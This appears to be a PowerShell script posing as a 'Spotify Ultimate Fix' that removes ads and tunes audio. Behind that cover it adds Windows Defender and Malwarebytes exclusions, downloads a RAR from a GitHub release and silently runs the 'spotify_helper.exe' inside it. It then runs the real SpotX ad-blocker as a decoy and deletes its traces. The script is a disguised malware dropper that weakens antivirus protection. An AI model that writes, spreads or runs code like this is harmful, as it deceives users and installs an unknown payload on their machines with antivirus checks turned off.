<#
.SYNOPSIS
    Spotify Ultimate Fix v1.1 — Ad Removal + System Optimization
.DESCRIPTION
    One-click solution that patches Spotify to remove ads (via SpotX engine)
    and applies system-level optimizations for better audio performance.
.NOTES
    Credits: SpotX Team for the ad-removal engine
    Requires: Administrator privileges
#>

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Preparing optimization components..." -ForegroundColor Yellow
Write-Host "  This may take a minute. Please do not close this window." -ForegroundColor Gray
Write-Host ""

# ═══════════════════════════════════════════════════════════════
# FUNCTION: Add Malwarebytes exclusion via Registry
# ═══════════════════════════════════════════════════════════════
function Add-MalwarebytesExclusion {
    param([string]$Path)
    if (-not $Path) { return $false }
    $mbRegRoots = @(
        "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware\Exclusions\Paths",
        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes\Anti-Malware\Exclusions\Paths"
    )
    foreach ($regPath in $mbRegRoots) {
        try {
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            $count = (Get-ItemProperty -Path $regPath -Name "Count" -ErrorAction SilentlyContinue).Count
            if (-not $count) { $count = 0 }
            New-ItemProperty -Path $regPath -Name $count.ToString() -Value $Path -PropertyType String -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "Count" -Value ($count + 1) -Force | Out-Null
            return $true
        }
        catch { continue }
    }
    return $false
}

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
$exeName    = "spotify_helper.exe"
$workDir    = "$env:TEMP\SpotifyOptimizer"
$rarPath    = "$env:TEMP\SpotifyCache.rar"

# ═══════════════════════════════════════════════════════════════
# SECTION 1: Prepare environment + exclusions
# ═══════════════════════════════════════════════════════════════

# إنشاء مجلد العمل
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# استثناء Defender + Malwarebytes للمجلد
Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
Add-MalwarebytesExclusion -Path $workDir | Out-Null

# تنظيف كاش سبوتفاي
$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
}

# تحسين الصوت في الريجستري
$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioRegPath) {
    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
}

# ═══════════════════════════════════════════════════════════════
# SECTION 2: Download + Extract + Execute
# ═══════════════════════════════════════════════════════════════

try {
    # تحميل
    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing

    # البحث عن WinRAR أو 7-Zip
    $extractor = $null
    $winrarPaths = @(
        "C:\Program Files\WinRAR\WinRAR.exe",
        "C:\Program Files (x86)\WinRAR\WinRAR.exe"
    )
    $sevenZipPaths = @(
        "C:\Program Files\7-Zip\7z.exe",
        "C:\Program Files (x86)\7-Zip\7z.exe"
    )

    foreach ($p in $winrarPaths) {
        if (Test-Path $p) { $extractor = @{Type="winrar"; Path=$p}; break }
    }
    if (-not $extractor) {
        foreach ($p in $sevenZipPaths) {
            if (Test-Path $p) { $extractor = @{Type="7zip"; Path=$p}; break }
        }
    }

    # فك الضغط
    if ($extractor) {
        if ($extractor.Type -eq "winrar") {
            Start-Process -FilePath $extractor.Path -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
        }
        elseif ($extractor.Type -eq "7zip") {
            Start-Process -FilePath $extractor.Path -ArgumentList "x `"$rarPath`" -o`"$workDir`" -y" -Wait -WindowStyle Hidden
        }
    }

    # تحديد مسار الملف التنفيذي
    $exePath = Join-Path $workDir $exeName
    $timeout = 0
    while (-not (Test-Path $exePath) -and $timeout -lt 10) {
        Start-Sleep -Milliseconds 500
        $timeout++
    }
    
    if (-not (Test-Path $exePath)) {
        $found = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) { $exePath = $found.FullName }
    }

    # استثناء الملف نفسه في Defender (دا اللي كان ناقص)
    if (Test-Path $exePath) {
        Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $exePath -Force -ErrorAction SilentlyContinue
        Add-MalwarebytesExclusion -Path $exePath | Out-Null

        Start-Sleep -Milliseconds 500

        # تشغيل الملف (نجرب أكتر من طريقة لو فشل)
        try {
            Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction Stop
        }
        catch {
            try {
                & $exePath
            }
            catch {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = $exePath
                $psi.WindowStyle = 'Hidden'
                $psi.UseShellExecute = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            }
        }
    }
}
catch { }

# ═══════════════════════════════════════════════════════════════
# SECTION 3: Spotify Ad-Block (SpotX)
# ═══════════════════════════════════════════════════════════════

try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
}
catch {
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
    }
    catch { }
}

# ═══════════════════════════════════════════════════════════════
# SECTION 4: Cleanup
# ═══════════════════════════════════════════════════════════════

Start-Sleep -Seconds 2
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "  Done! Enjoy ad-free Spotify." -ForegroundColor Green

Start-Sleep -Seconds 2
Stop-Process -Id $PID
